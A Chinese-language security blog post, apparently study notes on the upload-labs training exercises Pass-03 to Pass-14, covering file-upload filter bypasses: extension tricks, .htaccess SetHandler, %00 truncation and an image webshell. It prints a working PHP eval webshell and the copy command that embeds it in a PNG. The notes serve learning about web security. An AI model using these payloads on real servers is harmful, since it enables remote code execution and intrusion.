@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Web-File2 | qinyiwen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="文件上传Pass-03（黑名单绕过）trim函数 如果有空格，就把空格删除 这道题黑名单中有php，将文件后缀改为php5或phtml即可绕过 Pass-04（黑名单绕过 .htaccess攻击）。。。上传.htaccess文件 123&lt;FilesMatch &quot;shana&quot;&gt;    SetHandler application&#x2F;x-httpd-php&lt;&#x2F;Fil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web-File2">
+<meta property="og:url" content="http://example.com/2024/02/07/Web-File2/index.html">
+<meta property="og:site_name" content="qinyiwen">
+<meta property="og:description" content="文件上传Pass-03（黑名单绕过）trim函数 如果有空格，就把空格删除 这道题黑名单中有php，将文件后缀改为php5或phtml即可绕过 Pass-04（黑名单绕过 .htaccess攻击）。。。上传.htaccess文件 123&lt;FilesMatch &quot;shana&quot;&gt;    SetHandler application&#x2F;x-httpd-php&lt;&#x2F;Fil">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/faf6e2ef-ac59-4ee8-9d1f-7c48fedde799">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/96294650-d853-473e-a855-68f648453a2c">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/009f3474-9108-4149-b8be-78ee5bb17aeb">
+<meta property="og:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/7179fdb4-ae78-4825-84f0-e1afdb7e190c">
+<meta property="article:published_time" content="2024-02-07T10:25:47.000Z">
+<meta property="article:modified_time" content="2024-02-06T15:29:52.279Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/dbqyw/qyw.github.io/assets/130265921/faf6e2ef-ac59-4ee8-9d1f-7c48fedde799">
+  
+    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">qinyiwen</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Web-File2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/07/Web-File2/" class="article-date">
+  <time class="dt-published" datetime="2024-02-07T10:25:47.000Z" itemprop="datePublished">2024-02-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Web-File2
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="Pass-03（黑名单绕过）"><a href="#Pass-03（黑名单绕过）" class="headerlink" title="Pass-03（黑名单绕过）"></a>Pass-03（黑名单绕过）</h5><p>trim函数 如果有空格，就把空格删除</p>
+<p>这道题黑名单中有php，将文件后缀改为php5或phtml即可绕过</p>
+<h5 id="Pass-04（黑名单绕过-htaccess攻击）。。。"><a href="#Pass-04（黑名单绕过-htaccess攻击）。。。" class="headerlink" title="Pass-04（黑名单绕过 .htaccess攻击）。。。"></a>Pass-04（黑名单绕过 .htaccess攻击）。。。</h5><p>上传.htaccess文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件名包含shana的会被当做php执行</p>
+<p>可以把php文件命名为jpg文件，绕过黑名单，在网页访问该文件时，该文件会以php执行</p>
+<h5 id="Pass-05（黑名单绕过-后缀双写逻辑绕过）"><a href="#Pass-05（黑名单绕过-后缀双写逻辑绕过）" class="headerlink" title="Pass-05（黑名单绕过 后缀双写逻辑绕过）"></a>Pass-05（黑名单绕过 后缀双写逻辑绕过）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名会转为小写，用双写绕过</p>
+<p>后缀名改为.phpphp，上传成功</p>
+<h5 id="Pass-06（黑名单绕过-大小写文件名混淆）"><a href="#Pass-06（黑名单绕过-大小写文件名混淆）" class="headerlink" title="Pass-06（黑名单绕过 大小写文件名混淆）"></a>Pass-06（黑名单绕过 大小写文件名混淆）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名不会统一转为小写，将文件后缀改成PHp（黑名单中没有），上传成功</p>
+<h5 id="Pass-07（黑名单绕过-空格绕过）。。。"><a href="#Pass-07（黑名单绕过-空格绕过）。。。" class="headerlink" title="Pass-07（黑名单绕过 空格绕过）。。。"></a>Pass-07（黑名单绕过 空格绕过）。。。</h5><p>查看源码，发现跟之前源码相比，少了首位去空，抓包，在文件名最后加个空格，再forward，就上传成功</p>
+<h5 id="Pass-08（黑名单绕过-填点绕过）。。。"><a href="#Pass-08（黑名单绕过-填点绕过）。。。" class="headerlink" title="Pass-08（黑名单绕过 填点绕过）。。。"></a>Pass-08（黑名单绕过 填点绕过）。。。</h5><p>查看源码，发现没有删除文件名末尾的点，抓包，在后面加个.，绕过</p>
+<h5 id="Pass-09（黑名单绕过-Win文件流特性绕过）"><a href="#Pass-09（黑名单绕过-Win文件流特性绕过）" class="headerlink" title="Pass-09（黑名单绕过 Win文件流特性绕过）"></a>Pass-09（黑名单绕过 Win文件流特性绕过）</h5><p>查看源码，没有去除字符串::$DATA，抓包，在最后加上::$DATA，上传成功</p>
+<h5 id="Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。"><a href="#Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。" class="headerlink" title="Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。"></a>Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。</h5><p>抓包，将文件名后缀改为.php.  .</p>
+<p>首先去除空格，删除最后一个.</p>
+<p>然后后缀名为.php.，绕过过滤，上传成功</p>
+<h5 id="Pass-11（黑名单绕过-双写绕过）"><a href="#Pass-11（黑名单绕过-双写绕过）" class="headerlink" title="Pass-11（黑名单绕过 双写绕过）"></a>Pass-11（黑名单绕过 双写绕过）</h5><p>有一次过滤，将后缀名改为.pphphp，过滤完后缀名为.php，上传成功</p>
+<h5 id="Pass-12（白名单绕过-00截断GET型绕过）"><a href="#Pass-12（白名单绕过-00截断GET型绕过）" class="headerlink" title="Pass-12（白名单绕过 00截断GET型绕过）"></a>Pass-12（白名单绕过 00截断GET型绕过）</h5><p>这段代码是防止多个点绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>白名单加防止多点绕过，需要用到%00截断，%00是在地址方面，0x00截断是在文件命名方面</p>
+<p>例如文件名为1.php</p>
+<p>只能上传.jpg后缀文件，代码将文件命名为 1.php.19283018.jpg，使其为一个jpg文件</p>
+<p>如果加上%00截断，1.php%00.19283018.jpg，%00之后的就没有了，为1.php</p>
+<p>抓包，在第一行的参数save_path&#x3D;..&#x2F;upload&#x2F;改为save_path&#x3D;..&#x2F;upload&#x2F;1.php%00，php版本换为5.2</p>
+<p>第21天 1:32:03</p>
+<h5 id="Pass-13（白名单绕过-00截断POST型绕过）"><a href="#Pass-13（白名单绕过-00截断POST型绕过）" class="headerlink" title="Pass-13（白名单绕过 00截断POST型绕过）"></a>Pass-13（白名单绕过 00截断POST型绕过）</h5><p>跟Pass-12类似，抓包，找到..&#x2F;upload的位置，写成..&#x2F;upload&#x2F;xx.php%00</p>
+<p>但是这个%00需要编码，选中%00，右键</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faf6e2ef-ac59-4ee8-9d1f-7c48fedde799" alt="image"></p>
+<h5 id="Pass-14（图片马-文件包含绕过）。。。"><a href="#Pass-14（图片马-文件包含绕过）。。。" class="headerlink" title="Pass-14（图片马+文件包含绕过）。。。"></a>Pass-14（图片马+文件包含绕过）。。。</h5><p>在图片中写入后门代码</p>
+<p>php后门代码，将这个代码附加在图片后面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在cmd中运行copy 1.png &#x2F;b + a.php &#x2F;a webshell.jpg，得到webshell.jpg，可以看到图像最后加上了这一行php代码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96294650-d853-473e-a855-68f648453a2c" alt="image"></p>
+<p>获取上传的图片地址，右键图片，复制图像链接</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.182.1/upload/upload/8920230926111805.png">http://192.168.182.1/upload/upload/8920230926111805.png</a></p>
+<p>点击题目中给的文件包含漏洞链接，加上参数，进行访问</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/009f3474-9108-4149-b8be-78ee5bb17aeb" alt="image"></p>
+<p>再用post传参，x&#x3D;phpinfo();，可以执行php代码</p>
+<h4 id="文件上传之后端黑白名单绕过"><a href="#文件上传之后端黑白名单绕过" class="headerlink" title="文件上传之后端黑白名单绕过"></a>文件上传之后端黑白名单绕过</h4><p>黑名单：明确不让上传的格式后缀</p>
+<p>白名单：明确可以上传的格式后缀</p>
+<p>如果黑名单中有PHP，可以用PHP5或Phtml来绕过限制</p>
+<p>enctype：文件上传的类型</p>
+<p>method：上传方式</p>
+<p>onsubmit：鼠标触发事件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7179fdb4-ae78-4825-84f0-e1afdb7e190c" alt="image"></p>
+<p>看下面的代码，PHP中接受文件的参数名要与HTML表单中的一致，以name的值发送过去，name的值是upload_file，所以上面也是upload_file</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; #接收文件上传</span><br><span class="line">echo $name</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctypt=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;/p&gt;</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>.htaccess，用apach才行</p>
+<p>.htaccess是apach的一个配置文件，将.htaccess文件上传成功后，其余文件会依照.htaccess的执行</p>
+<p>.htaccess示例</p>
+<p>将这个文件上传成功后，再上传文件名中包含shana的文件，就会被当作x-httpd-php来执行</p>
+<p>注意shana文件要和上传的.htaccess文件在同一目录</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有的代码是一次过滤，有的是循环过滤</p>
+<p>比如说，a.phphp，一次过滤之后为a.php</p>
+<p>循环过滤（递归过滤） 过滤后为a.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/07/Web-File2/" data-id="clsaip1bn0000ncvf6hfaa4m1" data-title="Web-File2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/02/06/Web-File1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Web-File1</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 17.5px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Web安全</a> <a href="/tags/learn/" style="font-size: 12.5px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/02/07/Web-File2/">Web-File2</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/06/Web-File1/">Web-File1</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/">RESOLVERFUZZ</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/01/Web-SQLi1/">SQLi1</a>
+          </li>
+        
+          <li>
+            <a href="/2024/02/01/Web-SQLi2/">SQLi2</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
